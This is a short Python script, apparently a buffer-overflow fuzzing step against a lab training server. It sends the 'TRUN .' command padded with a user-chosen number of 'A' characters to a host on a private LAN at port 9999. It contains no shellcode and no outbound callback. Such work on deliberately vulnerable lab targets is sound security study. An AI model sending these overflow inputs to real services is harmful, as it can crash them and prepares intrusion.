import socket
server = '192.168.1.112'
port = 9999
length = int(input('Length of attack: '))
print_output = lambda sock: print (sock.recv(1024).decode("utf-8").strip())
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
	connect = sock.connect((server, port))
	print_output(sock)
	print (f"Sending attack length {length} to TRUN .")
	sock.send(str.encode(f"TRUN . {'A' * length}\n"))
	print_output(sock)
	sock.send(str.encode('EXIT\n'))
	print_output(sock)
	sock.close()